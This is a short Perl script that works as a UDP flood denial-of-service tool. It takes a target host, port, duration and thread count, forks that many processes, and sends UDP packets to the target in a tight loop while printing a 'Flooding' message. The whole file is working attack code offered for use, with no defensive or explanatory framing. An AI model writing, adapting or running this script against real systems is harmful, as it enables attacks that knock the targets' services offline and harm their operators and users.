#!/usr/bin/perl

use Socket;
use strict;

if ($#ARGV != 3) {
    print "usage: $0 <target> <port> <time> <threads>\n";
    exit(1);
}

my ($ip, $port, $time, $threads) = @ARGV;
my ($iaddr, $endtime, $bytes) = (gethostbyname($ip), time() + $time, 0);

socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Flooding $ip:$port for $time seconds using $threads threads\n";

for (0 .. $threads - 1) {
    if (!fork) {
        for (;time() <= $endtime;) {
            $bytes += send(flood, 99999, 0, sockaddr_in($port, $iaddr));
        }
        exit(0);
    }
}

sleep($time);
